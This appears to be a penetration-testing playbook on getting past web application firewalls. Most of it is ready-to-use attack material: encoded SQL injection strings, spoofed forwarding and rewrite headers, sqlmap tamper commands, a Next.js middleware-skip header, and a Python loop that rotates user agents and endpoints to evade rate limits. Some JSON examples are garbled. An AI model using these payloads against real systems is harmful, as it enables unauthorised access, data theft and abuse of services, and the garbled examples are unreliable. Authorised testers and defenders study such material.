# API WAF Bypass Techniques (2025)

## When this applies

- WAF blocks injection / mass-assignment payloads on the standard JSON request.
- You need to deliver the same payload through encoding, content-type, header injection, or framework parsing quirks.
- Goal: deliver the malicious value past the WAF while preserving its semantic effect at the origin.

## Technique

Try, in priority order: encoding variants, content-type swap, parameter pollution, header injection, sqlmap tamper scripts, framework-specific bypasses (Next.js middleware), JSON encoding tricks, and rate-limit bypass via IP rotation.

## Steps

### Encoding and obfuscation

```
Normal:        admin' OR 1=1--
Single encode: admin%27%20OR%201%3D1--
Double encode: admin%2527%2520OR%25201%253D1--
Unicode:       admin' OR 1=1--
Mixed:         admin%27 OR 1%3d1--
```

### Case randomization

```sql
SeLeCt * FrOm users WhErE username='admin'
```

### Inline comments

```sql
SEL/**/ECT * FR/**/OM users
SEL/*comment*/ECT * FR//OM users
SEL/*! ECT*/ * FR/*! OM*/ users
```

### HTTP parameter pollution — framework-specific

**PHP (uses last):**
```http
user=normal&user=admin
# PHP sees: user=admin
```

**ASP.NET (concatenates):**
```http
user=normal&user=admin
# ASP.NET sees: user=normal,admin
```

**Node.js (uses first):**
```http
user=admin&user=normal
# Node.js sees: user=admin
```

### Header injection — IP / URL spoofing

```http
X-Forwarded-For: ' OR 1=1--
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
True-Client-IP: 127.0.0.1
Forwarded: for=127.0.0.1
```

### SQLMap tamper scripts

```bash
# Random case
sqlmap -u "http://target.com/api?id=1" --tamper=randomcase

# Space to comment
sqlmap -u "http://target.com/api?id=1" --tamper=space2comment

# Unicode encode
sqlmap -u "http://target.com/api?id=1" --tamper=charunicodeencode

# Multiple tampers
sqlmap -u "http://target.com/api?id=1" --tamper=randomcase,space2comment,charunicodeencode
```

**Custom tamper script:**
```python
def tamper(payload):
    payload = payload.replace(" ", "/**/")
    payload = ''.join(choice((c.upper(), c.lower())) for c in payload)
    payload += "&dummy=value&foo=bar"
    return payload
```

### Next.js middleware bypass (CVE-2025-29927)

```http
GET /api/admin HTTP/1.1
x-middleware-subreq: skip
# Bypass Next.js middleware completely
```

### JSON injection variations

**Unicode escaping:**
```json
{
  "username": "admin"
}
// Decodes to: admin
```

**Null byte:**
```json
{
  "username": "useradmin"
}
```

### Rate limiting bypass — IP rotation

```http
X-Forwarded-For: 1.2.3.4, 5.6.7.8, 9.10.11.12
X-Originating-IP: 192.168.1.100
True-Client-IP: 10.0.0.5
```

### Distributed requests

```python
# Rotate User-Agents
user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)'
]

# Rotate endpoints
endpoints = ['/api/v1/data', '/api/v2/data', '/api/data']

# Add random parameters
for i in range(1000):
    requests.get(
        random.choice(endpoints),
        headers={'User-Agent': random.choice(user_agents)},
        params={'_': str(time.time()), 'cache': random.randint(1, 999999)}
    )
```

## Verifying success

- The WAF returns the expected blocking response on plain payload, but accepts the obfuscated variant.
- Origin returns the injected behavior (DB error, 200 with bypass).
- The same payload structure works across multiple endpoints once the bypass is identified.

## Common pitfalls

- Some WAFs decode Unicode/double-encoding before inspection — those bypasses fail. Try content-type swap instead.
- HPP behavior differs across the WAF and origin — test that the WAF sees one value and origin sees another.
- Header injection only works when origin trusts the spoofed header (read source / response behaviour).

## Tools

- Burp Suite Repeater + Intruder
- sqlmap with `--tamper`
- Burp Logger++ (compare WAF and origin responses)
- nuclei (WAF detection templates)
